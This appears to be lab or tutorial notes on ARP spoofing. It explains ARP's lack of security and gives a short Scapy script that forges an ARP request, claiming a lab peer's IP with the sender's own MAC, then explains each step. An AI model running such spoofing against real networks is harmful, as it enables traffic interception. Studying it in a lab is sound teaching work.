# ARP Spoofing Attack
The Address Resolution Protocol (ARP) is a communication protocol used for discovering the link layer address, such as the MAC address, given an IP address. The ARP protocol is a very simple protocol, and it does not implement any security measure.

## ARP Request
```
#!/usr/bin/env python3
from scapy.all import *

# Create Ethernet and ARP objects
ethernet = Ether(dst='02:42:0a:09:00:05', src='02:42:0a:09:00:69')
arp = ARP(op=1, pdst='10.9.0.5', hwsrc='02:42:0a:09:00:69', hwdst='02:42:0a:09:00:05', psrc='10.9.0.6')

# Echo message before sending packet
print("Nigel is sending an ARP request")

# Send the packet
sendp(ethernet/arp) 
```

This script uses the Scapy library to construct and send an ARP request packet. <br/>
It first creates Ethernet and ARP objects to define the packet's source and destination addresses, as well as the IP addresses involved. <br/>
It then prints the message ```"Nigel is sending an ARP request"``` before sending the packet using the ```sendp``` function.
